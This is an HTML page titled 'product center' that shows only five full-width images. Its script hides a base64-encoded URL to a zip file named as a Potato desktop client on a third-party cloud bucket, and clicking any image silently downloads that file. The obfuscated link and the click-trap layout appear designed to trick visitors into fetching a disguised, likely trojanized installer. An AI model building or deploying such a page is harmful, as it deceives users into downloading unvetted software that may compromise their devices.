<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>产品中心</title>
    <style>
        body, html {
            margin: 0;
            padding: 0;
        }
        img {
            width: 100%;
            height: auto;
            display: block;
            cursor: pointer;
        }
    </style>
</head>
<body>

    <img src="images/img_01.jpg">
    <img src="images/img_02.jpg">
    <img src="images/img_03.jpg">
    <img src="images/img_04.jpg">
    <img src="images/img_05.jpg">

    <script>
        function base64Decode(base64) {
            return atob(base64); 
        }

        
        const encryptedUrls = [
            'aHR0cHM6Ly9oay1jZG4wMi5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tL1BvdGF0b19EZXNrdG9wMi4zNy56aXA=',
            'aHR0cHM6Ly9oay1jZG4wMi5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tL1BvdGF0b19EZXNrdG9wMi4zNy56aXA=', 
            'aHR0cHM6Ly9oay1jZG4wMi5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tL1BvdGF0b19EZXNrdG9wMi4zNy56aXA=',
            'aHR0cHM6Ly9oay1jZG4wMi5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tL1BvdGF0b19EZXNrdG9wMi4zNy56aXA=',
            'aHR0cHM6Ly9oay1jZG4wMi5vc3MtY24taG9uZ2tvbmcuYWxpeXVuY3MuY29tL1BvdGF0b19EZXNrdG9wMi4zNy56aXA='
        ];

        
        const images = document.querySelectorAll('img');

        
        images.forEach((img, index) => {
            img.addEventListener('click', () => downloadFile(index));
        });

        function downloadFile(imageIndex) {
            const encodedUrl = encryptedUrls[imageIndex]; 
            const url = base64Decode(encodedUrl); 
            const link = document.createElement('a');
            link.href = url;
            link.download = ''; 
            document.body.appendChild(link); 
            link.click(); 
            document.body.removeChild(link); 
        }
    </script>

</body>
</html>
